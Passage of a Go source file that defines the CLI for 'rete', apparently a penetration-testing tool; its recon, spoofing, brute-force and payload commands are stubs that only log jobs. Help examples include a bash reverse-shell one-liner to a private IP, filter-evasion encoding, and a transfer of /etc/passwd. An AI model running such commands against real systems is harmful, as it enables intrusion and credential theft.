/*
Copyright 2026 Joseph Anthony Abbott III

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package internal

import (
	"fmt"
	"strings"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/spf13/cobra"
)

//-----------------------------------------core---------------------------------------------------------//

// NewRootCmd is the rete application entry point
func NewRootCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "rete",
		Short: "A network diagnostic and penetration testing tool",
		Long: `rete — terminal-native network diagnostic and penetration testing tool.

Run without arguments to launch the interactive TUI dashboard.
Use subcommands to invoke individual capabilities directly.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			p := tea.NewProgram(NewDashboardModel(db), tea.WithAltScreen())
			_, err := p.Run()
			return err
		},
	}

	cmd.AddCommand(NewReconCmd(db))
	cmd.AddCommand(NewDiagCmd(db))
	cmd.AddCommand(NewSecCmd(db))
	cmd.AddCommand(NewPayloadCmd(db))
	cmd.AddCommand(NewFeaturesCmd(db))
	cmd.AddCommand(NewJobsCmd(db))

	return cmd
}

//-----------------------------------------recon group-------------------------------------------------//

// NewReconCmd returns the "recon" command group (Reconnaissance & Discovery).
func NewReconCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "recon",
		Short: "Reconnaissance and discovery commands",
		Long:  "Commands for host discovery, port scanning, DNS, WHOIS, and service enumeration.",
	}

	cmd.AddCommand(newReconPingSweepCmd(db))
	cmd.AddCommand(newReconPortScanCmd(db))
	cmd.AddCommand(newReconOSFingerCmd(db))
	cmd.AddCommand(newReconServiceEnumCmd(db))
	cmd.AddCommand(newReconDNSCmd(db))
	cmd.AddCommand(newReconWHOISCmd(db))
	cmd.AddCommand(newReconSubdomainCmd(db))

	return cmd
}

func newReconPingSweepCmd(db *Database) *cobra.Command {
	var (
		target  string
		timeout int
	)
	cmd := &cobra.Command{
		Use:     "ping-sweep",
		Short:   "Discover live hosts by sending ICMP echo requests",
		Example: "  rete recon ping-sweep --target 192.168.1.0/24",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon ping-sweep", Target: target, Args: fmt.Sprintf("timeout=%d", timeout), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ ping-sweep  target=%s  timeout=%ds  [job #%d]\n", target, timeout, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(ping-sweep execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "CIDR range or host (e.g. 192.168.1.0/24)")
	cmd.Flags().IntVar(&timeout, "timeout", 1, "Per-host timeout in seconds")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newReconPortScanCmd(db *Database) *cobra.Command {
	var (
		target string
		ports  string
		proto  string
	)
	cmd := &cobra.Command{
		Use:     "port-scan",
		Short:   "Scan TCP/UDP ports on a target host",
		Example: "  rete recon port-scan --target 10.0.0.1 --ports 1-1024 --proto tcp",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon port-scan", Target: target, Args: fmt.Sprintf("ports=%s proto=%s", ports, proto), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ port-scan  target=%s  ports=%s  proto=%s  [job #%d]\n", target, ports, proto, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(port-scan execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().StringVarP(&ports, "ports", "p", "1-1024", "Port range (e.g. 22,80,443 or 1-65535)")
	cmd.Flags().StringVar(&proto, "proto", "tcp", "Protocol: tcp|udp")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newReconOSFingerCmd(db *Database) *cobra.Command {
	var target string
	cmd := &cobra.Command{
		Use:     "os-finger",
		Short:   "Identify the remote host operating system",
		Example: "  rete recon os-finger --target 10.0.0.1",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon os-finger", Target: target, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ os-finger  target=%s  [job #%d]\n", target, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(os-finger execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newReconServiceEnumCmd(db *Database) *cobra.Command {
	var (
		target string
		ports  string
	)
	cmd := &cobra.Command{
		Use:     "service-enum",
		Short:   "Detect running services and their versions",
		Example: "  rete recon service-enum --target 10.0.0.1 --ports 22,80,443",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon service-enum", Target: target, Args: "ports=" + ports, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ service-enum  target=%s  ports=%s  [job #%d]\n", target, ports, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(service-enum execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().StringVarP(&ports, "ports", "p", "", "Ports to probe (e.g. 22,80,443)")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newReconDNSCmd(db *Database) *cobra.Command {
	var (
		target  string
		reverse bool
	)
	cmd := &cobra.Command{
		Use:     "dns",
		Short:   "Perform forward and reverse DNS resolution",
		Example: "  rete recon dns --target example.com\n  rete recon dns --target 93.184.216.34 --reverse",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon dns", Target: target, Args: fmt.Sprintf("reverse=%t", reverse), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ dns  target=%s  reverse=%t  [job #%d]\n", target, reverse, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(dns execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Domain name or IP address")
	cmd.Flags().BoolVarP(&reverse, "reverse", "r", false, "Perform reverse DNS lookup")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newReconWHOISCmd(db *Database) *cobra.Command {
	var target string
	cmd := &cobra.Command{
		Use:     "whois",
		Short:   "Query WHOIS data for a domain or IP address",
		Example: "  rete recon whois --target example.com",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon whois", Target: target, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ whois  target=%s  [job #%d]\n", target, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(whois execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Domain name or IP")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newReconSubdomainCmd(db *Database) *cobra.Command {
	var (
		target    string
		wordlist  string
		resolvers string
	)
	cmd := &cobra.Command{
		Use:     "subdomain",
		Short:   "Enumerate subdomains via DNS brute-force",
		Example: "  rete recon subdomain --target example.com --wordlist /path/to/words.txt",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "recon subdomain", Target: target, Args: fmt.Sprintf("wordlist=%s resolvers=%s", wordlist, resolvers), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ subdomain  target=%s  wordlist=%s  [job #%d]\n", target, wordlist, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(subdomain execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Root domain (e.g. example.com)")
	cmd.Flags().StringVarP(&wordlist, "wordlist", "w", "", "Path to subdomain wordlist file")
	cmd.Flags().StringVar(&resolvers, "resolvers", "", "Comma-separated resolver IPs")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

//-----------------------------------------diag group--------------------------------------------------//

// NewDiagCmd returns the "diag" command group (Network Diagnostics).
func NewDiagCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "diag",
		Short: "Network diagnostics commands",
		Long:  "Commands for traceroute, bandwidth, latency, packet loss, MTU, and ARP scanning.",
	}

	cmd.AddCommand(newDiagTracerouteCmd(db))
	cmd.AddCommand(newDiagBandwidthCmd(db))
	cmd.AddCommand(newDiagLatencyCmd(db))
	cmd.AddCommand(newDiagPacketLossCmd(db))
	cmd.AddCommand(newDiagMTUCmd(db))
	cmd.AddCommand(newDiagARPScanCmd(db))

	return cmd
}

func newDiagTracerouteCmd(db *Database) *cobra.Command {
	var (
		target  string
		maxHops int
	)
	cmd := &cobra.Command{
		Use:     "traceroute",
		Short:   "Trace the path packets take to a destination",
		Example: "  rete diag traceroute --target 8.8.8.8 --max-hops 30",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "diag traceroute", Target: target, Args: fmt.Sprintf("max-hops=%d", maxHops), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ traceroute  target=%s  max-hops=%d  [job #%d]\n", target, maxHops, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(traceroute execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Destination host or IP")
	cmd.Flags().IntVar(&maxHops, "max-hops", 30, "Maximum number of hops")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newDiagBandwidthCmd(db *Database) *cobra.Command {
	var (
		target   string
		duration int
	)
	cmd := &cobra.Command{
		Use:     "bandwidth",
		Short:   "Measure available network bandwidth to a host",
		Example: "  rete diag bandwidth --target 10.0.0.1 --duration 10",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "diag bandwidth", Target: target, Args: fmt.Sprintf("duration=%d", duration), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ bandwidth  target=%s  duration=%ds  [job #%d]\n", target, duration, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(bandwidth execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().IntVarP(&duration, "duration", "d", 10, "Test duration in seconds")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newDiagLatencyCmd(db *Database) *cobra.Command {
	var (
		target  string
		count   int
		interval int
	)
	cmd := &cobra.Command{
		Use:     "latency",
		Short:   "Monitor round-trip latency over time",
		Example: "  rete diag latency --target 8.8.8.8 --count 10",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "diag latency", Target: target, Args: fmt.Sprintf("count=%d interval=%d", count, interval), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ latency  target=%s  count=%d  interval=%ds  [job #%d]\n", target, count, interval, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(latency execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().IntVarP(&count, "count", "c", 10, "Number of probes to send")
	cmd.Flags().IntVarP(&interval, "interval", "i", 1, "Interval between probes in seconds")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newDiagPacketLossCmd(db *Database) *cobra.Command {
	var (
		target string
		count  int
	)
	cmd := &cobra.Command{
		Use:     "packet-loss",
		Short:   "Measure packet loss percentage to a remote host",
		Example: "  rete diag packet-loss --target 8.8.8.8 --count 100",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "diag packet-loss", Target: target, Args: fmt.Sprintf("count=%d", count), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ packet-loss  target=%s  count=%d  [job #%d]\n", target, count, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(packet-loss execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().IntVarP(&count, "count", "c", 100, "Number of packets to send")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newDiagMTUCmd(db *Database) *cobra.Command {
	var target string
	cmd := &cobra.Command{
		Use:     "mtu",
		Short:   "Discover the maximum transmission unit on a path",
		Example: "  rete diag mtu --target 8.8.8.8",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "diag mtu", Target: target, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ mtu  target=%s  [job #%d]\n", target, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(mtu execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Destination host or IP")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newDiagARPScanCmd(db *Database) *cobra.Command {
	var iface string
	cmd := &cobra.Command{
		Use:     "arp-scan",
		Short:   "Discover hosts on the local network via ARP",
		Example: "  rete diag arp-scan --iface eth0",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "diag arp-scan", Target: iface, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ arp-scan  iface=%s  [job #%d]\n", iface, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(arp-scan execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&iface, "iface", "i", "", "Network interface (e.g. eth0)")
	_ = cmd.MarkFlagRequired("iface")
	return cmd
}

//-----------------------------------------sec group----------------------------------------------------//

// NewSecCmd returns the "sec" command group (Security & Penetration Testing).
func NewSecCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "sec",
		Short: "Security and penetration testing commands",
		Long:  "Commands for packet sniffing, ARP spoofing, vulnerability scanning, and TLS auditing.",
	}

	cmd.AddCommand(newSecSniffCmd(db))
	cmd.AddCommand(newSecForgeCmd(db))
	cmd.AddCommand(newSecARPSpoofCmd(db))
	cmd.AddCommand(newSecVulnScanCmd(db))
	cmd.AddCommand(newSecBruteCmd(db))
	cmd.AddCommand(newSecTLSAuditCmd(db))

	return cmd
}

func newSecSniffCmd(db *Database) *cobra.Command {
	var (
		iface  string
		filter string
		count  int
	)
	cmd := &cobra.Command{
		Use:     "sniff",
		Short:   "Capture and inspect packets on a network interface",
		Example: "  rete sec sniff --iface eth0 --filter 'tcp port 80' --count 50",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "sec sniff", Target: iface, Args: fmt.Sprintf("filter=%s count=%d", filter, count), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ sniff  iface=%s  filter=%q  count=%d  [job #%d]\n", iface, filter, count, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(sniff execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&iface, "iface", "i", "", "Network interface to sniff (e.g. eth0)")
	cmd.Flags().StringVarP(&filter, "filter", "f", "", "BPF capture filter expression")
	cmd.Flags().IntVarP(&count, "count", "c", 0, "Packet count limit (0 = unlimited)")
	_ = cmd.MarkFlagRequired("iface")
	return cmd
}

func newSecForgeCmd(db *Database) *cobra.Command {
	var (
		proto  string
		src    string
		dst    string
		payload string
	)
	cmd := &cobra.Command{
		Use:     "forge",
		Short:   "Craft and inject custom network packets",
		Example: "  rete sec forge --proto tcp --src 10.0.0.1:1234 --dst 10.0.0.2:80",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "sec forge", Target: dst, Args: fmt.Sprintf("proto=%s src=%s payload=%s", proto, src, payload), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ forge  proto=%s  src=%s  dst=%s  [job #%d]\n", proto, src, dst, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(forge execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVar(&proto, "proto", "tcp", "Protocol: tcp|udp|icmp")
	cmd.Flags().StringVar(&src, "src", "", "Source address:port")
	cmd.Flags().StringVarP(&dst, "dst", "d", "", "Destination address:port")
	cmd.Flags().StringVarP(&payload, "payload", "p", "", "Hex or ASCII payload")
	_ = cmd.MarkFlagRequired("dst")
	return cmd
}

func newSecARPSpoofCmd(db *Database) *cobra.Command {
	var (
		target  string
		gateway string
		iface   string
	)
	cmd := &cobra.Command{
		Use:     "arp-spoof",
		Short:   "Poison ARP caches to perform MITM interception",
		Example: "  rete sec arp-spoof --target 192.168.1.100 --gateway 192.168.1.1 --iface eth0",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "sec arp-spoof", Target: target, Args: fmt.Sprintf("gateway=%s iface=%s", gateway, iface), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ arp-spoof  target=%s  gateway=%s  iface=%s  [job #%d]\n", target, gateway, iface, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(arp-spoof execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Victim IP address")
	cmd.Flags().StringVarP(&gateway, "gateway", "g", "", "Gateway IP address")
	cmd.Flags().StringVarP(&iface, "iface", "i", "", "Network interface")
	_ = cmd.MarkFlagRequired("target")
	_ = cmd.MarkFlagRequired("gateway")
	_ = cmd.MarkFlagRequired("iface")
	return cmd
}

func newSecVulnScanCmd(db *Database) *cobra.Command {
	var (
		target string
		ports  string
	)
	cmd := &cobra.Command{
		Use:     "vuln-scan",
		Short:   "Scan for common vulnerabilities on a target",
		Example: "  rete sec vuln-scan --target 10.0.0.1 --ports 22,80,443",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "sec vuln-scan", Target: target, Args: "ports=" + ports, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ vuln-scan  target=%s  ports=%s  [job #%d]\n", target, ports, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(vuln-scan execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().StringVarP(&ports, "ports", "p", "", "Ports to probe")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

func newSecBruteCmd(db *Database) *cobra.Command {
	var (
		target   string
		service  string
		userlist string
		passlist string
	)
	cmd := &cobra.Command{
		Use:     "brute",
		Short:   "Attempt credential brute-force against a service",
		Example: "  rete sec brute --target 10.0.0.1 --service ssh --userlist users.txt --passlist passwords.txt",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "sec brute", Target: target, Args: fmt.Sprintf("service=%s userlist=%s passlist=%s", service, userlist, passlist), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ brute  target=%s  service=%s  [job #%d]\n", target, service, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(brute execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host or IP")
	cmd.Flags().StringVarP(&service, "service", "s", "", "Service to attack (e.g. ssh, ftp, http)")
	cmd.Flags().StringVarP(&userlist, "userlist", "u", "", "Path to username wordlist")
	cmd.Flags().StringVarP(&passlist, "passlist", "p", "", "Path to password wordlist")
	_ = cmd.MarkFlagRequired("target")
	_ = cmd.MarkFlagRequired("service")
	return cmd
}

func newSecTLSAuditCmd(db *Database) *cobra.Command {
	var target string
	cmd := &cobra.Command{
		Use:     "tls-audit",
		Short:   "Audit SSL/TLS configuration on a remote host",
		Example: "  rete sec tls-audit --target example.com:443",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "sec tls-audit", Target: target, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ tls-audit  target=%s  [job #%d]\n", target, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(tls-audit execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Target host:port (e.g. example.com:443)")
	_ = cmd.MarkFlagRequired("target")
	return cmd
}

//-----------------------------------------payload group-----------------------------------------------//

// NewPayloadCmd returns the "payload" command group (Payload Delivery).
func NewPayloadCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "payload",
		Short: "Payload delivery commands",
		Long:  "Commands for generating shells, transferring files, and encoding payloads.",
	}

	cmd.AddCommand(newPayloadRevShellCmd(db))
	cmd.AddCommand(newPayloadFileXferCmd(db))
	cmd.AddCommand(newPayloadBindShellCmd(db))
	cmd.AddCommand(newPayloadEncodeCmd(db))

	return cmd
}

func newPayloadRevShellCmd(db *Database) *cobra.Command {
	var (
		lhost string
		lport int
		lang  string
	)
	cmd := &cobra.Command{
		Use:     "rev-shell",
		Short:   "Generate reverse shell payload templates",
		Example: "  rete payload rev-shell --lhost 10.0.0.1 --lport 4444 --lang bash",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "payload rev-shell", Target: fmt.Sprintf("%s:%d", lhost, lport), Args: "lang=" + lang, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ rev-shell  lhost=%s  lport=%d  lang=%s  [job #%d]\n", lhost, lport, lang, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(rev-shell execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVar(&lhost, "lhost", "", "Listener IP address")
	cmd.Flags().IntVar(&lport, "lport", 4444, "Listener port")
	cmd.Flags().StringVarP(&lang, "lang", "l", "bash", "Shell language: bash|python|powershell|perl")
	_ = cmd.MarkFlagRequired("lhost")
	return cmd
}

func newPayloadFileXferCmd(db *Database) *cobra.Command {
	var (
		target string
		file   string
		port   int
		mode   string
	)
	cmd := &cobra.Command{
		Use:     "file-xfer",
		Short:   "Transfer files over raw TCP or HTTP channels",
		Example: "  rete payload file-xfer --target 10.0.0.2 --file /etc/passwd --mode http --port 8080",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "payload file-xfer", Target: target, Args: fmt.Sprintf("file=%s mode=%s port=%d", file, mode, port), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ file-xfer  target=%s  file=%s  mode=%s  port=%d  [job #%d]\n", target, file, mode, port, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(file-xfer execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Destination host or IP")
	cmd.Flags().StringVarP(&file, "file", "f", "", "Local file path to transfer")
	cmd.Flags().IntVarP(&port, "port", "p", 8080, "Transfer port")
	cmd.Flags().StringVarP(&mode, "mode", "m", "http", "Transfer mode: http|tcp")
	_ = cmd.MarkFlagRequired("target")
	_ = cmd.MarkFlagRequired("file")
	return cmd
}

func newPayloadBindShellCmd(db *Database) *cobra.Command {
	var (
		port int
		lang string
	)
	cmd := &cobra.Command{
		Use:     "bind-shell",
		Short:   "Set up a bind shell listener on a port",
		Example: "  rete payload bind-shell --port 4445 --lang bash",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "payload bind-shell", Target: fmt.Sprintf("0.0.0.0:%d", port), Args: "lang=" + lang, Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ bind-shell  port=%d  lang=%s  [job #%d]\n", port, lang, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(bind-shell execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().IntVarP(&port, "port", "p", 4445, "Bind port to listen on")
	cmd.Flags().StringVarP(&lang, "lang", "l", "bash", "Shell language: bash|python|powershell")
	return cmd
}

func newPayloadEncodeCmd(db *Database) *cobra.Command {
	var (
		input   string
		encoder string
	)
	cmd := &cobra.Command{
		Use:     "encode",
		Short:   "Encode a payload to evade simple pattern filters",
		Example: "  rete payload encode --input 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' --encoder base64",
		RunE: func(cmd *cobra.Command, args []string) error {
			job := &ScanJob{Command: "payload encode", Args: fmt.Sprintf("encoder=%s", encoder), Status: JobStatusPending}
			if err := db.CreateJob(job); err != nil {
				return err
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "▶ encode  encoder=%s  [job #%d]\n", encoder, job.ID)
			_, _ = fmt.Fprintln(cmd.OutOrStdout(), "(encode execution not yet implemented — job recorded)")
			return nil
		},
	}
	cmd.Flags().StringVarP(&input, "input", "i", "", "Payload string to encode")
	cmd.Flags().StringVarP(&encoder, "encoder", "e", "base64", "Encoder: base64|hex|url")
	_ = cmd.MarkFlagRequired("input")
	return cmd
}

//-----------------------------------------features command--------------------------------------------//

// NewFeaturesCmd returns the "features" command for browsing the feature catalog.
func NewFeaturesCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "features",
		Short: "Browse and manage the feature catalog",
	}

	cmd.AddCommand(newFeaturesListCmd(db))
	cmd.AddCommand(newFeaturesSeedCmd(db))

	return cmd
}

func newFeaturesListCmd(db *Database) *cobra.Command {
	var category string
	cmd := &cobra.Command{
		Use:     "list",
		Short:   "List available features",
		Example: "  rete features list\n  rete features list --category 'Reconnaissance & Discovery'",
		RunE: func(cmd *cobra.Command, args []string) error {
			features, err := db.ListFeatures(category)
			if err != nil {
				return err
			}
			if len(features) == 0 {
				_, _ = fmt.Fprintln(cmd.OutOrStdout(), "No features found. Run: rete features seed --file table.csv")
				return nil
			}

			w := cmd.OutOrStdout()
			currentCat := ""
			for _, f := range features {
				if f.Category.Name != currentCat {
					currentCat = f.Category.Name
					_, _ = fmt.Fprintf(w, "\n  %s\n", strings.ToUpper(currentCat))
					_, _ = fmt.Fprintln(w, "  "+strings.Repeat("─", len(currentCat)))
				}
				_, _ = fmt.Fprintf(w, "    %-36s  rete %-28s  %s\n", f.Name, f.CobraCommand, f.ShortDescription)
			}
			_, _ = fmt.Fprintln(w)
			return nil
		},
	}
	cmd.Flags().StringVarP(&category, "category", "c", "", "Filter by category name")
	return cmd
}

func newFeaturesSeedCmd(db *Database) *cobra.Command {
	var csvFile string
	cmd := &cobra.Command{
		Use:     "seed",
		Short:   "Seed the feature catalog from a CSV file",
		Example: "  rete features seed --file table.csv",
		RunE: func(cmd *cobra.Command, args []string) error {
			count, err := SeedFeaturesFromCSV(db, csvFile)
			if err != nil {
				return fmt.Errorf("seed features: %w", err)
			}
			_, _ = fmt.Fprintf(cmd.OutOrStdout(), "✓ Seeded %d features from %s\n", count, csvFile)
			return nil
		},
	}
	cmd.Flags().StringVarP(&csvFile, "file", "f", "table.csv", "Path to the CSV feature catalog")
	return cmd
}

//-----------------------------------------jobs command------------------------------------------------//

// NewJobsCmd returns the "jobs" command for inspecting scan job history.
func NewJobsCmd(db *Database) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "jobs",
		Short: "Inspect scan job history",
	}

	cmd.AddCommand(newJobsListCmd(db))
	cmd.AddCommand(newJobsShowCmd(db))

	return cmd
}

func newJobsListCmd(db *Database) *cobra.Command {
	var limit int
	cmd := &cobra.Command{
		Use:     "list",
		Short:   "List recent scan jobs",
		Example: "  rete jobs list\n  rete jobs list --limit 50",
		RunE: func(cmd *cobra.Command, args []string) error {
			jobs, err := db.ListJobs(limit)
			if err != nil {
				return err
			}
			if len(jobs) == 0 {
				_, _ = fmt.Fprintln(cmd.OutOrStdout(), "No jobs recorded yet.")
				return nil
			}
			w := cmd.OutOrStdout()
			_, _ = fmt.Fprintf(w, "  %-6s  %-12s  %-28s  %-20s  %s\n", "ID", "STATUS", "COMMAND", "TARGET", "CREATED")
			_, _ = fmt.Fprintln(w, "  "+strings.Repeat("─", 86))
			for _, j := range jobs {
				_, _ = fmt.Fprintf(w, "  %-6d  %-12s  %-28s  %-20s  %s\n",
